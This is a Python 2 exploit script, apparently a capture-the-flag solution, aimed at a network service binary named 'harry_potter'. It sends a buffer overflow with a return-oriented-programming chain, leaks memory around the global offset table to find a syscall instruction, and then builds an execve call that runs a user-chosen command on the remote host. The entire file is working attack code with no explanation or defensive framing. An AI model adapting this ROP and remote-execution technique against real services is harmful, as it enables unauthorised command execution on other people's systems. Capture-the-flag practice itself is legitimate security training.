#!/usr/bin/env python

import os
import sys
import struct
import socket
import puppeteer as p
#import time

if len(sys.argv) != 4:
    print "USAGE: ./exp.py hostname /full/path/to/command arg1"
    print ""
    print "You can use hostname 'file' to launch the harry_potter file directly instead of connecting over the network."
    exit()


hostname = sys.argv[1]
portport = 666 if hostname != 'localhost' else 6666

# possibilities
# 0x4010f9                  add    ebx,esi

class Harry(p.Manipulator):
    def __init__(self, host, port): # pylint: disable=unused-argument
        p.Manipulator.__init__(self, arch=p.amd64)
        self.host = host
        self.port = port

        self.G_PRINT = self.gadget(0x400F95) # probably clobbers just about everything
        self.G_POP_RBX = self.gadget(0x401355, pops={'rbx': 0, 'rbp': 1})
        self.G_WRITE_MEM = self.gadget(0x40187c, pops={'rbx': 0, 'rbp': 1})
        self.G_XCHG_RAX_RDI = self.gadget(0x4016b5, pops={'rbx': 0, 'rbp': 1})
        self.G_XCHG_ESP_EAX = self.gadget(0x401316, clobbers={'eax', 'esp'})

        # no side-effects
        self.G_POP_RSI = self.gadget(0x404278, pops={'rsi': 0})
        self.G_POP_RDI = self.gadget(0x4040f3, pops={'rdi': 0})
        self.G_POP_RBP = self.gadget(0x4010c5, pops={'rbp': 0})
        self.G_RET = self.gadget(0x401357)
        self.G_POP_RET = self.gadget(0x401356, pops={'rbp': 0})

        self.G_CALL_SRBX = self.gadget(0x400f7a, leave=p.ROPGadget.LEAVE_CALL)

    def rop_set_register(self, reg, value):
        if reg == 'rsi':
            return self.G_POP_RSI(value)
        elif reg == 'rdi':
            return self.G_POP_RDI(value)
        elif reg == 'rax':
            return self.G_POP_RDI(value) + self.G_XCHG_RAX_RDI()
        elif reg == 'rbx':
            return self.G_POP_RBX(value)

    def rop_puts(self, addr):
        return self.rop_set_register('rsi', addr) + self.G_PRINT()

    def rop_write_byte(self, addr, value):
        rop = self.rop()
        rop += self.rop_set_register('rax', addr)
        rop += self.rop_set_register('rbx', value)
        rop += self.G_WRITE_MEM()
        return rop

    def rop_write_bytes(self, addr, buff):
        rop = self.rop()
        for n, c in enumerate(buff):
            rop += self.rop_write_byte(addr + n, ord(c))
        return rop

    def fire_rop(self, payload):
        if self.host != 'file':
            c = p.Connection(host=self.host, port=self.port)
        else:
            c = p.Connection(exe="./harry_potter")

        #c.read(len('If you guess the password, I will give you a reward!\n'))
        c.read_until('reward!\n')

        # padding
        rop = 'A' * 1056

        # this is needed for the exception stack unwrapping to not crash
        rop += self.pack(0x400f00)

        # that weird address padding is needed to keep rbx pointing to
        rop += 'B'*24
        rop += self.G_RET()*28 + self.G_POP_RET('\x00'*8) # this jumps over the null env
        rop += payload
        exploit = struct.pack('<I', len(rop) + 10) + rop.build()

        open("sent_exploit", "wb").write(exploit)

        c.send(exploit)

        #if self.host != 'filename':
        c.shutdown(socket.SHUT_WR)
        #else: out_f.close()
        #c.read(len('EXCEPTION: Error during read\n'))
        c.read_until('read\n')

        r = c.recv(8192)
        #r = in_f.read()
        #print "BOOM:", repr(r)
        return r[:-1]

    # clobbers the qword before and qword after
    # we need the top dword of rdx to be equal to the top dword of rsp in the beginning here
    def deref_at_qword(self, addr, lsb):
        #bytes_before = self.pack({ 'rsi':G_POP_RSI, 'rdi':G_POP_RDI, 'rbp':G_POP_RBP }[reg])
        bytes_before = self.pack(self.G_POP_RSI.addr)
        bytes_after = self.pack(self.G_PRINT.addr)

        rop = self.rop()
        rop += self.rop_write_byte(addr, lsb)
        rop += self.rop_write_bytes(addr - 8, bytes_before)
        rop += self.rop_write_bytes(addr + 8, bytes_after)
        rop += self.rop_set_register('rax', addr - 8)
        rop += self.G_XCHG_ESP_EAX()

        return self.fire_rop(rop)

    def dump_256(self, addr):
        r = ""
        while len(r) < 256:
            s = self.deref_at_qword(addr, len(r))

            # retry the null returns just in case something broke
            if s == '':
                s = self.deref_at_qword(addr, len(r))

            r += s + '\x00'
        return r

    def dump_got_neighborhood(self, entry):
        addr = 0x605250 + entry*8
        filename = 'dumped/got_0x%x' % addr

        if not os.path.exists(filename):
            print "!!!!!!!!!"
            print "!!!!!!!!! DUMPING 0x%x (entry %d)" % (addr, entry)
            print "!!!!!!!!!"
            open(filename, "wb").write(self.dump_256(addr))

    def modify_and_check(self, addr, value):
        rop = self.rop()
        rop += self.rop_write_byte(addr, value)
        rop += self.rop_puts(addr)
        return self.fire_rop(rop)[:1]

    def execve(self, command, arg, call_offset):
        argv0_ptr_location = 0x605320
        argv1_ptr_location = 0x605328
        null_location = 0x605330
        cmd_location =  0x605338
        argv1_location = cmd_location+len(command)+2

        rop = self.rop()

        # set up the arguments
        print "COMMAND WILL BE:",command,arg
        rop += self.rop_write_bytes(cmd_location, command + '\x00')
        rop += self.rop_write_bytes(argv0_ptr_location, self.pack(cmd_location))
        rop += self.rop_write_bytes(argv1_ptr_location, self.pack(argv1_location))
        rop += self.rop_write_bytes(argv1_location, arg + '\x00')
        rop += self.rop_write_bytes(null_location, self.pack(0))

        # point to the syscall

        rop += self.rop_write_byte(0x605270, call_offset)

        # set up the stack that'll set up eax
        rop += self.rop_set_register('rax', 59)
        rop += self.rop_set_register('rdi', cmd_location)
        rop += self.rop_set_register('rsi', argv0_ptr_location)

        # and call!
        rop += self.rop_set_register('rbx', 0x605270)
        rop += self.G_CALL_SRBX()

        return self.fire_rop(rop)

    @p.memory_read_flags(safe=False)
    def read_crash(self, addr, length):
        rop = self.rop_puts(addr)
        return self.fire_rop(rop)[:length]

def main():
    #print hex(h.unpack(h.read_crash(0x404496, 8))) # reward
    #h = Harry(hostname, portport)
    #r = h.read_crash(0x605270, 1) # some code
    #print hex(h.unpack(r + '\x00'*(8-len(r))))

    #h = Harry(hostname, portport)
    #r = h.modify_and_check(0x605270, 0x41) # some code
    #print r

    #h = Harry(hostname, portport)
    #print repr(h.deref_at_qword(0x605270, 0)) # some code

    #print repr(r)
    #h.dump_got_neighborhood(4)

    #for i in range(1, 26):
    #   h = Harry(hostname, portport)
    #   h.dump_got_neighborhood(i)

    print "DUMPING AREA AROUND READ"
    h = Harry(hostname, portport)
    r = h.dump_256(0x605270)

    sc_offset = r.index('\x0f\x05')
    print "SYSCALL OFFSET IS:",hex(sc_offset)

    h = Harry(hostname, portport)
    print "||||| BOOOOOOOOM"
    print "".join(h.execve(sys.argv[2], sys.argv[3], sc_offset))


main()
